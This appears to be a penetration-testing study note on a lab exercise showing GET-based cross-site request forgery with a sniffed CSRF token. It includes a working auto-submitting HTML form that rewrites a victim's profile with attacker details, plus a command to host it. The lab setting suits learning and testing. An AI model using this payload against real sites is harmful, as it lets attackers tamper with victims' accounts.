---
title: f-GET Based CSRF
draft: false
tags:
  - csrf
---
Similar to how we can extract session cookies from applications that do not utilize SSL encryption, we can do the same regarding CSRF tokens included in unencrypted requests.

## Exploitation

> Log-in to the vulnerable web app. Click and save Julie Roger's profile.

Intercepting the profile update traffic with Burp, we will see the below:

```
GET /app/save/julie.rogers@example.com?telephone=1234&country=Korea&csrf=234dfg0230j23r9v032o4n0sdvsjnf2034&action=save
```

We can see that CSRF token is included in the GET request.

Let's say an attacker on the local network sniffed the above request.

First, create and serve the below HTML page. Save it as `notmalicious_get.html`

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Notice that the CSRF token's value above is the same as the CSRF token's value in the captured/"sniffed" request.

You can serve the page above from your attacking machine as follows.

```shell-session
jadu101@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

While still logged in as Julie Rogers, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious_get.html`. You will notice that Julie Rogers' profile details will change to the ones we specified in the HTML page you are serving.

